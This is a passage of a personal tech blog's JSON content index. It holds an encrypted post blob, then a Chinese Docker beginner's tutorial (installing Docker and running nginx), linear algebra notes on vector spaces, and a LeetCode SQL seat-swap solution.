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","updated":"2020-07-19T00:23:28.054Z","tags":[{"name":"life","slug":"life","permalink":"http://xwolf191.github.io/tags/life/"}]},{"title":"docker基础","date":"2018-08-28T02:00:00.000Z","path":"2018/08/28/devops/docker基础/","text":"Docker 是一个开源的应用容器引擎，基于 Go 语言 并遵从Apache2.0协议开源。 Docker 可以让开发者打包他们的应用以及依赖包到一个轻量级、可移植的容器中，然后发布到任何流行的 Linux 机器上，也可以实现虚拟化。容器是完全使用沙箱机制，相互之间不会有任何接口（类似 iPhone 的 app）,更重要的是容器性能开销极低。此文以安装nginx为例，简单了解docker的使用。 Docker核心概念镜像(image)Docker镜像是由文件系统叠加而成。最底端是一个文件引导系统，即bootfs。Docker用户不会与引导文件系统有直接的交互。Docker镜像的第二层是root文件系统rootfs，通常是一种或多种操作系统，例如ubuntu等。在Docker中，文件系统永远都是只读的，在每次修改时，都是进行拷贝叠加从而形成最终的文件系统。Docker称这样的文件为镜像。一个镜像可以迭代在另一个镜像的顶部。位于下方的镜像称之为父镜像，最底层的镜像称之为基础镜像。最后，当从一个镜像启动容器时，Docker会在最顶层加载一个读写文件系统作为容器。 容器(container)镜像是静态的，镜像的每一层都只是可读的，而容器是动态的里面运行着我们指定的应用，容器里面的应用可能会新建一个文件，修改一个目录，这些操作所带来的改变并不会作用到镜像里面，因为镜像只是可读的。所以通过镜像创建容器就是在镜像上加一个可读写的层。 仓库(repository)仓库和maven中jar仓库一样,是几种存放管理镜像的地方. 安装Dockercentos 6.9安装docker12345678910111213141516171819202122232425262728293031# 查看系统版本uname -aLinux docker 2.6.32-696.el6.x86_64 #1 SMP Tue Mar 21 19:29:05 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux#安装EPEL,因为系统自带的repo中不带docker需要安装epelrpm -Uvh http://ftp.riken.jp/Linux/fedora/epel/6Server/x86_64/epel-release-6-8.noarch.rpm# 卸载老版本dockersudo yum remove docker \\ docker-client \\ docker-client-latest \\ docker-common \\ docker-latest \\ docker-latest-logrotate \\ docker-logrotate \\ docker-selinux \\ docker-engine-selinux \\ docker-engine# 安装dockeryum install -y docker-io# 启动dockersudo service docker start# 查看docker运行状态sudo service docker status 安装镜像搜索镜像1docker search nginx 其中各字段信息为: NAME:镜像仓库源的名称 DESCRIPTION:镜像的描述 STARS:表示评分 OFFICIAL:是否docker官方发布 AUTOMATED:是否自动创建。该类资源允许用户验证资源的来源和内容。 下载镜像可以使用docker pull NAME[:TAG]命令从网络上下载镜像。如果不显式指定TAG,默认会选择latest标签,即下载最新版本的镜像。 1docker pull nginx 查看镜像的详细信息用命令docker images 查看所有安装的镜像信息,用 inspect IMAGE ID 查看详细信息 1234567[root@bogon ~]# docker imagesREPOSITORY TAG IMAGE ID CREATED SIZEconsul latest 21c1d4ed11da 2 weeks ago 105MBerlang latest fd257b036a25 4 weeks ago 1.06GBrabbitmq management d69a5113ceae 2 months ago 149MBrabbitmq latest e8261c2af9fe 2 months ago 125MB 其中各项信息含义为： REPOSITORY,镜像的来源仓库信息 TAG,镜像的标签信息 IMAGE ID,镜像的ID CREATED,创建时间 SIZE,镜像大小 1[root@docker ~]# docker inspect 7b2ec12a5042 详细信息如下12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788[&#123; \"Id\": \"7b2ec12a50420a859b2731071494750a1040b4e9c76a43ea5cf9179712df5f2a\", \"Parent\": \"1ae58a018d101a53ff771cb30a37e01fe1e0f3ff34abe335178673d8c2135bda\", \"Comment\": \"\", \"Created\": \"2018-07-24T17:21:51.548456912Z\", \"Container\": \"895e85f09f69727097e9c1783362736d7ee9b5b32f9eae1e5e32f2e1002abf14\", \"ContainerConfig\": &#123; \"Hostname\": \"895e85f09f69\", \"Domainname\": \"\", \"User\": \"\", \"AttachStdin\": false, \"AttachStdout\": false, \"AttachStderr\": false, \"PortSpecs\": null, \"ExposedPorts\": &#123; \"80/tcp\": &#123;&#125; &#125;, \"Tty\": false, \"OpenStdin\": false, \"StdinOnce\": false, \"Env\": [ \"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\", \"NGINX_VERSION=1.15.2-1~stretch\", \"NJS_VERSION=1.15.2.0.2.2-1~stretch\" ], \"Cmd\": [ \"/bin/sh\", \"-c\", \"#(nop) \", \"CMD [\\\"nginx\\\" \\\"-g\\\" \\\"daemon off;\\\"]\" ], \"Image\": \"sha256:f1eea4ec6bee804c269e8443513d7afe26adb1615518ad56d014973fd5faa5f3\", \"Volumes\": null, \"VolumeDriver\": \"\", \"WorkingDir\": \"\", \"Entrypoint\": null, \"NetworkDisabled\": false, \"MacAddress\": \"\", \"OnBuild\": [], \"Labels\": &#123; \"maintainer\": \"NGINX Docker Maintainers \\u003cdocker-maint@nginx.com\\u003e\" &#125; &#125;, \"DockerVersion\": \"17.06.2-ce\", \"Author\": \"\", \"Config\": &#123; \"Hostname\": \"\", \"Domainname\": \"\", \"User\": \"\", \"AttachStdin\": false, \"AttachStdout\": false, \"AttachStderr\": false, \"PortSpecs\": null, \"ExposedPorts\": &#123; \"80/tcp\": &#123;&#125; &#125;, \"Tty\": false, \"OpenStdin\": false, \"StdinOnce\": false, \"Env\": [ \"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\", \"NGINX_VERSION=1.15.2-1~stretch\", \"NJS_VERSION=1.15.2.0.2.2-1~stretch\" ], \"Cmd\": [ \"nginx\", \"-g\", \"daemon off;\" ], \"Image\": \"sha256:f1eea4ec6bee804c269e8443513d7afe26adb1615518ad56d014973fd5faa5f3\", \"Volumes\": null, \"VolumeDriver\": \"\", \"WorkingDir\": \"\", \"Entrypoint\": null, \"NetworkDisabled\": false, \"MacAddress\": \"\", \"OnBuild\": [], \"Labels\": &#123; \"maintainer\": \"NGINX Docker Maintainers \\u003cdocker-maint@nginx.com\\u003e\" &#125; &#125;, \"Architecture\": \"amd64\", \"Os\": \"linux\", \"Size\": 0, \"VirtualSize\": 108954999&#125;] 删除镜像docker images 命令查看镜像id,docker rmi IMAGE ID来删除镜像。 1docker rmi 3535063d9957 提示被容器使用,不能被删除。可以添加参数-f来强制删除镜像，但是会有很多遗留问题，不建议。通常先删除容器再删除镜像。查看正在运行的容器1docker ps -a 删除容器,用docker rm CONTAINER ID 命令来删除容器,删除成功后返回CONTAINER ID. 容器删除成功后，执行删除镜像命令,1docker rmi IMAGE ID 再次执行命令查看镜像信息,发现镜像已经被删除。 启动nginx1docker run -d -P nginx -d 指定后台启动 -P 当使用 -P 标记时，Docker 会随机映射一个 49000~49900 的端口到内部容器开放的网络端口。 此时,docker会将应用的默认端口映射到主机的一个随机端口上。可以通过-p命令来指定docker端口和主机端口的映射关系。 1docker run -d -p 80:80 --name nginx_web nginx -p 指定容器和主机的端口 —name 指定容器的名称 停止nginx根据指定的名称或者id来停止服务 1docker stop nginx_web 遇到的问题 启动nginx失败防火墙失败 ,重新启动docker即可。 参考资料 docker技术入门与实践 docker官网","updated":"2020-07-19T00:23:27.776Z","tags":[{"name":"docker","slug":"docker","permalink":"http://xwolf191.github.io/tags/docker/"}]},{"title":"线性代数三之向量空间","date":"2018-08-13T16:10:00.000Z","path":"2018/08/14/数学/线性代数三之向量空间/","text":"向量空间是现代数学中的一个基本概念。是线性代数研究的基本对象。 向量空间的一个直观模型是向量几何，几何上的向量及相关的运算即向量加法，标量乘法，以及对运算的一些限制如封闭性，结合律，已大致地描述了“向量空间”这个数学概念的直观形象。 在现代数学中，“向量”的概念不仅限于此，满足下列公理的任何数学对象都可被当作向量处理。譬如，实系数多项式的集合在定义适当的运算后构成向量空间，在代数上处理是方便的。单变元实函数的集合在定义适当的运算后，也构成向量空间，研究此类函数向量空间的数学分支称为泛函分析。 定义和例子欧几里得向量空间首先最基本的向量空间就是欧几里得向量空间$R^n,n=1,2,3…$。为简单起见我们首先考虑$R^2$。$R^2$中的非零向量在几何上表示有向线段。这种集合表示有利于我们理解$R^2$中标量乘法和加法的作用。给定一非零向量$\\vec{x} = \\begin{bmatrix}x_1 \\x_2\\end{bmatrix}$,可将其和一个坐标平面上从(0,0)到点$(x_1,x_2)$的有向线段对应起来。如果将相同长度和方向的线段看成是相同的,则$\\vec{x}$可用任何从(a,b)到$(a+x_1,b+x_2)$的线段表示。我们将向量$\\vec{x} = \\begin{bmatrix}x_1 \\x_2\\end{bmatrix}$的欧几里得长度看成是任何表示$\\vec{x}$的有向线段的长度。从(0,0)到$(x_1,x_2)$的有向线段的长度为$\\sqrt{x_1^2+x_2^2}$。对每一个向量$\\vec{x} = \\begin{bmatrix}x_1 \\x_2\\end{bmatrix}$和每一个标量$\\alpha$,乘积$\\alpha\\vec{x}$定义为$\\alpha\\begin{bmatrix}x_1 \\x_2\\end{bmatrix} =\\begin{bmatrix}\\alpha x_1 \\\\alpha x_2\\end{bmatrix} $。 两个向量$\\vec{a}=\\begin{bmatrix}a_1 \\a_2\\end{bmatrix} 和\\vec{b}=\\begin{bmatrix}b_1 \\b_2\\end{bmatrix}的和的定义为 \\vec{a}+\\vec{b} = \\begin{bmatrix}a_1+b_1 \\a_2+b_2\\end{bmatrix}$。如果$\\vec{b}$放置在$\\vec{a}$的终点上,则$\\vec{a}+\\vec{b}$表示从$\\vec{a}$的起点到$\\vec{b}$的终点的有向线段。 一般地，$R^n$中的标量乘法和加法定义为$\\alpha \\vec{x}=\\begin{bmatrix}\\alpha x_1 \\\\alpha x_2 \\{\\vdots}\\\\alpha x_n\\end{bmatrix} 和 \\vec{x}+\\vec{y} = \\begin{bmatrix}x_1+y_1 \\x_2+y_2 \\{\\vdots}\\x_n+y_n\\end{bmatrix}$，其中$\\vec{x},\\vec{y} \\in R^n,且\\alpha为标量$。 向量空间$R^{m\\times n}$我们可以将$R^n$空间看成是所有元素都是实数的$n\\times 1$矩阵的集合。$R^n$中向量的加法和标量乘法就是通常的矩阵的加法和标量的乘法。更一般地,用$R^{m\\times n}$表示所有$m\\times n$实矩阵的集合。$R^{m\\times n}$上的加法运算和标量乘法运算遵循特定的代数运算法则。这些法则构成了定义向量空间概念的公理。 向量空间的公理定义令V为一定义了加法和标量乘法运算的集合。这意味着，对V中的每一对元素x和y,可唯一对应V中的一个元素x+y，且对每一个V中的元素x和每一个标量a,可唯一对应V中的元素ax。如果集合V连同其上的加法和标量乘法运算满足下面的公理,则称为向量空间。 对V中的任何的x和y,x+y = y+x。 对V中的任何的x,y和z。(x+y)+z = x+(y+z)。 V中存在一个元素0,满足对任意的$x\\in V$有x+0 = x 。 对每一$x\\in V$,存在V中的一个元素-x,满足 x+(-x) = 0。 对任意标量a和V中的元素x,y,有 a(x+y) = ax+ ay。 对任意标量a和b及$x\\in V$,有(a+b)x = ax+bx。 对任意标量a和b及$x\\in V$,有(ab)x = a(bx)。 对所有$x\\in V$,有 $1\\cdot x = x$ 。 我们称V为空间向量的全集,它的元素称为向量(vector)。并用黑斜体小写字母表示。术语标量(scalar)通常是指实数,一般用小写字母表示。定义中一个重要的部分是两个运算的封闭性,这个性质可以归纳如下: 若$x\\in V$,且a为标量，则$ax \\in V$。 若 $x,y\\in V$,则 $ x+y \\in V$。 如果一个集合不满足封闭性则不是向量空间。例如 W= { (a,1)|a是实数 },可能不满足加法和标量乘法。 向量空间C[a,b]用向量空间C[a,b]表示所有定义在闭区间[a,b]上的实值连续函数。此时，全集为一函数集合。因此，我们的向量为C[a,b]中的函数。C[a,b]中两个函数的和f+g定义为对所有[a,b]中的x,(f+g)(x) = f(x)+g(x)。新函数f+g也是C[a,b]中的元素,因为两个连续函数的和仍为连续函数。同理,若f是C[a,b]中的函数，a为一个实数，则af定义为对所有[a,b]中的x,(af)(x) = af(x)。显然af是[a,b]中的元素,因为一个数乘以一个连续函数也总是连续函数。 向量空间$P_n$令$P_n$表示次数小于n的所有多项式的集合。定义p+q和ap为所有的实数x,有(p+q)(x) = p(x)+q(x)且(ap)(x) = ap(x)。此时，零向量是零多项式，$z(x) = 0x^{n-1}+0x^{n-2}+…+0x+0$。容易验证,向量空间的所有公理都成立。因此,$P_n$连同一般的函数加法和标量乘法构成一个向量空间。 向量空间的其他性质定理若V为向量空间,且x为V中的任一元素，则: 0x=0 x+y = 0 蕴涵 y=-x (-1)x = -x 子空间定义若S为向量空间V的非空子集,且S满足如下条件, 对任意标量a,若$x\\in S$,则$ax \\in S$ 若 $x\\in S 且y\\in S$,则$x+y \\in S$则S称为V的子空间。 向量空间的任何子空间仍未向量空间。 注意，在向量空间V中，容易验证{0}和V是V的子空间。所有其他子空间称为真子空间。我们称{0}为零空间。 矩阵的零空间\\text{…} 向量集合的张成向量空间的张成线性无关基和维数基变换行空间和列空间参考资料 向量空间 线性代数Steven J Leon(原书第8版)","updated":"2020-07-19T00:23:27.986Z","tags":[{"name":"线代","slug":"线代","permalink":"http://xwolf191.github.io/tags/线代/"}]},{"title":"626. Exchange Seats","date":"2018-08-10T10:20:00.000Z","path":"2018/08/10/数据库/mysql/leetcode/Exchange Seats/","text":"Mary is a teacher in a middle school and she has a table seat storing students’ names and their corresponding seat ids. The column id is continuous increment.Mary wants to change seats for the adjacent students.Can you write a SQL query to output the result for Mary? id student 1 Abbot 2 Doris 3 Emerson 4 Green 5 Jeames For the sample input, the output is: id student 1 Doris 2 Abbot 3 Green 4 Emerson 5 Jeames Note:If the number of students is odd, there is no need to change the last one’s seat. 题意解读学生座位信息表,其中id是连续递增的。老师想交换两个相邻学生的座位。如果学生人数是奇数，则无需更改最后一个学生座位。 实现 mysql 1234selectif(id &lt; (select count(*) from seat), if(id mod 2=0, id-1, id+1), if(id mod 2=0, id-1, id)) as id, studentfrom seatorder by id asc; 参考 626. Exchange 